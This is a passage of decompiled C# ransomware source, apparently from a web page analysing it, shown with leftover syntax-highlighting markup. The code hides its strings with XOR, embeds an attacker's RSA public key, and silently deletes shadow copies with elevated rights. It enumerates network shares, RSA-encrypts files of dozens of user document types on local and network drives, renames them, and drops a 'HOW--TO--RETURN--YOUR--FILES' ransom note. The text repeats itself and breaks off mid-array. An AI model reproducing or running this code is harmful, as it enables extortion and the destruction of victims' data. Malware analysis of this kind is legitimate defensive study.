class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xc6,190, 0xc3, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 